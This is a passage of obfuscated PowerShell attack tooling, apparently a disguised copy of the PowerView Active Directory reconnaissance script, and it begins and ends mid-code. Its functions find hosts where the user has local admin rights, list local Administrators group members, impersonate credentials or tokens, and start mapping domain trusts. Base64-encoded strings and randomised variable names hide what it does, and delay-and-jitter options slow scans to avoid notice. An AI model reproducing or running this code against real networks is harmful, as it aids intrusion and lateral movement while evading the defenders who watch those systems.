('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')
))]) { ${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ${e4eae45442e047e5aa48d7f04d9dc941} = $ComputerName
     
   }
        else {
            Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAUQ
B1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAG
QAbwBtAGEAaQBuAA==')))
            
${e4eae45442e047e5aa48d7f04d9dc941} = Get-DomainComputer 
@3cb1483537e3424195869ccaa8e07f42 | Select-Object -ExpandProperty 
dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] 
TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
        if 
(${e4eae45442e047e5aa48d7f04d9dc941}.Length -eq 0) {
            
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAATg
BvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AG
UA')))
        }
        ${d2a8f7b9002b4411b13bcd2f1a3115ec} = {
       
     Param($ComputerName, $TokenHandle)
            if ($TokenHandle) 
{
                $Null = Invoke-UserImpersonation -TokenHandle 
$TokenHandle -Quiet
            }
            ForEach 
(${40850bc66a0f4e928e6df4b311ffe16b} in $ComputerName) {
             
   ${4efbcb35501b479291674720e11a9ca9} = Test-Connection -Count 1 -
Quiet -ComputerName ${40850bc66a0f4e928e6df4b311ffe16b}
              
  if (${4efbcb35501b479291674720e11a9ca9}) {
                    
${8ee278542e6c48249b0d8f9302deeede} = Test-AdminAccess -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                    if 
(${8ee278542e6c48249b0d8f9302deeede}.IsAdmin) {
                      
  ${40850bc66a0f4e928e6df4b311ffe16b}
                    }
           
     }
            }
            if ($TokenHandle) {
                
Invoke-RevertToSelf
            }
        }
        
${bfcebd26467f492297f5dcbf75cad4ab} = $Null
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential
            }
            else {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential -Quiet
            }
        }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-
Verbose "[Find-LocalAdminAccess] Total number of hosts: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count)"
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAARA
BlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAH
QAdABlAHIA')))
            ${7e62acf6abb54c758ee4864a2533a125} = 0
    
        ${acdea612248b49fc9b8ce2f557f219ab} = New-Object 
System.Random
            ForEach 
(${40850bc66a0f4e928e6df4b311ffe16b} in 
${e4eae45442e047e5aa48d7f04d9dc941}) {
                
${7e62acf6abb54c758ee4864a2533a125} = 
${7e62acf6abb54c758ee4864a2533a125} + 1
                Start-Sleep 
-Seconds ${acdea612248b49fc9b8ce2f557f219ab}.Next((1-$Jitter)*
$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-
LocalAdminAccess] Enumerating server 
${40850bc66a0f4e928e6df4b311ffe16b} 
(${7e62acf6abb54c758ee4864a2533a125} of 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count))"
                
Invoke-Command -ScriptBlock ${d2a8f7b9002b4411b13bcd2f1a3115ec} -
ArgumentList ${40850bc66a0f4e928e6df4b311ffe16b}, 
${bfcebd26467f492297f5dcbf75cad4ab}
            }
        }
        
else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAVQ
BzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAG
QAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            
${d7a06eecc9954e48b3afbf05a1f9fca1} = @{
                
'TokenHandle' = ${bfcebd26467f492297f5dcbf75cad4ab}
            }
     
       New-ThreadedFunction -ComputerName 
${e4eae45442e047e5aa48d7f04d9dc941} -ScriptBlock 
${d2a8f7b9002b4411b13bcd2f1a3115ec} -ScriptParameters 
${d7a06eecc9954e48b3afbf05a1f9fca1} -Threads $Threads
        }
    }
}
function Find-DomainLocalGroupMember {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.LocalGroupMember.API')]
    [OutputType
('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter
(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DNSHostName')]
        [String[]]
        $ComputerName,
        
[ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
   
     [ValidateNotNullOrEmpty()]
        [String]
        
$ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        
[String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty
()]
        [Alias('OperatingSystem')]
        [String]
        
$ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        
[Alias('ServicePack')]
        [String]
        $ComputerServicePack,
  
      [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        
[String]
        $ComputerSiteName,
        [Parameter
(ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 
'Administrators',
        [ValidateSet('API', 'WinNT')]
        
[Alias('CollectionMethod')]
        [String]
        $Method = 'API',
  
      [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
  
      [String]
        $Server,
        [ValidateSet('Base', 
'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 
'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        
$ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        
[Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
    
    [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [ValidateRange
(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange
(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        
[ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        
${3cb1483537e3424195869ccaa8e07f42} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')
))]) { ${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ${e4eae45442e047e5aa48d7f04d9dc941} = $ComputerName
     
   }
        else {
            Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQ
BiAGUAcgBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG
4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            
${e4eae45442e047e5aa48d7f04d9dc941} = Get-DomainComputer 
@3cb1483537e3424195869ccaa8e07f42 | Select-Object -ExpandProperty 
dnshostname
        }
        Write-Verbose "[Find-
DomainLocalGroupMember] TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
        if 
(${e4eae45442e047e5aa48d7f04d9dc941}.Length -eq 0) {
            
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQ
BiAGUAcgBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAH
UAbQBlAHIAYQB0AGUA')))
        }
        
${d2a8f7b9002b4411b13bcd2f1a3115ec} = {
            Param
($ComputerName, $GroupName, $Method, $TokenHandle)
            if 
($GroupName -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                
${d32a0907252945f4be8a0e064e0bbd34} = New-Object 
System.Security.Principal.SecurityIdentifier
([System.Security.Principal.WellKnownSidType]::BuiltinAdministrators
Sid,$null)
                $GroupName = 
(${d32a0907252945f4be8a0e064e0bbd34}.Translate
([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
       
     }
            if ($TokenHandle) {
                $Null = 
Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            
}
            ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in 
$ComputerName) {
                ${4efbcb35501b479291674720e11a9ca9} 
= Test-Connection -Count 1 -Quiet -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                if 
(${4efbcb35501b479291674720e11a9ca9}) {
                    
${934b60179ab4446f99e01c3147620bf0} = @{
                        
'ComputerName' = ${40850bc66a0f4e928e6df4b311ffe16b}
                 
       'Method' = $Method
                        'GroupName' = 
$GroupName
                    }
                    Get-
NetLocalGroupMember @934b60179ab4446f99e01c3147620bf0
                
}
            }
            if ($TokenHandle) {
                
Invoke-RevertToSelf
            }
        }
        
${bfcebd26467f492297f5dcbf75cad4ab} = $Null
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential
            }
            else {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential -Quiet
            }
        }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-
Verbose "[Find-DomainLocalGroupMember] Total number of hosts: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count)"
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQ
BiAGUAcgBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAH
IAOgAgACQASgBpAHQAdABlAHIA')))
            
${7e62acf6abb54c758ee4864a2533a125} = 0
            
${acdea612248b49fc9b8ce2f557f219ab} = New-Object System.Random
       
     ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in 
${e4eae45442e047e5aa48d7f04d9dc941}) {
                
${7e62acf6abb54c758ee4864a2533a125} = 
${7e62acf6abb54c758ee4864a2533a125} + 1
                Start-Sleep 
-Seconds ${acdea612248b49fc9b8ce2f557f219ab}.Next((1-$Jitter)*
$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-
DomainLocalGroupMember] Enumerating server 
${40850bc66a0f4e928e6df4b311ffe16b} 
(${7e62acf6abb54c758ee4864a2533a125} of 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count))"
                
Invoke-Command -ScriptBlock ${d2a8f7b9002b4411b13bcd2f1a3115ec} -
ArgumentList ${40850bc66a0f4e928e6df4b311ffe16b}, $GroupName, 
$Method, ${bfcebd26467f492297f5dcbf75cad4ab}
            }
        }
   
     else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQ
BiAGUAcgBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoAC
AAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            
${d7a06eecc9954e48b3afbf05a1f9fca1} = @{
                'GroupName' 
= $GroupName
                'Method' = $Method
                
'TokenHandle' = ${bfcebd26467f492297f5dcbf75cad4ab}
            }
     
       New-ThreadedFunction -ComputerName 
${e4eae45442e047e5aa48d7f04d9dc941} -ScriptBlock 
${d2a8f7b9002b4411b13bcd2f1a3115ec} -ScriptParameters 
${d7a06eecc9954e48b3afbf05a1f9fca1} -Threads $Threads
        }
    }
  
  END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
            
Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Get-
DomainTrust {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.DomainTrust.NET')]
    [OutputType
('PowerView.DomainTrust.LDAP')]
    [OutputType
('PowerView.DomainTrust.API')]
    [CmdletBinding
(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter
(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
     
   [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
   
     [Parameter(ParameterSetName = 'NET')]
        [Switch]
        
$NET,
        [Parameter(ParameterSetName = 'LDAP')]
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
     
   [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
  
      [Parameter(ParameterSetName = 'LDAP')]
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [Parameter(ParameterSetName = 
'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [Parameter(ParameterSetName = 
'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        
[String]
        $SearchScope = 'Subtree',
        [Parameter
(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [Parameter
(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        
[Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 
'LDAP')]
        [Switch]
        $Tombstone,
        [Alias
('ReturnOne')]
        [Switch]
        $FindOne,
        [Parameter
(ParameterSetName = 'LDAP')]
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${b226ee4d9aef4de4af1b31e2e2a8ecc1} = @{
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBPAE4AXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBQAEwARQBWAEUATABfAE8ATgBMAFkA')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBJAEwAVABFAFIAXwBTAEkARABTAA==')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBPAFIARQBTAFQAXwBUAFIAQQBOAFMASQBUAEkAVgBFAA==')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4A')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwBJAFQASABJAE4AXwBGAE8AUgBFAFMAVAA=')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABSAEUAQQBUAF8AQQBTAF8ARQBYAFQARQBSAE4AQQBMAA==')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABSAFUAUwBUAF8AVQBTAEUAUwBfAFIAQwA0AF8ARQBOAEMAUgBZAFAAVABJAE8ATg
A=')))
            [uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABSAFUAUwBUAF8AVQBTAEUAUwBfAEEARQBTAF8ASwBFAFkAUwA=')))
           
 [uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAyADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBSAE8AUwBTAF8ATwBSAEcAQQBOAEkAWgBBAFQASQBPAE4AXwBOAE8AXwBUAEcAVA
BfAEQARQBMAEUARwBBAFQASQBPAE4A')))
            
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAA0ADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABJAE0AXwBUAFIAVQBTAFQA')))
        }
        
${ba9d933f672140a4beb8c5a9c4eb6fbe} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ba9d933f672140a4beb8c5a9c4eb6fbe}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
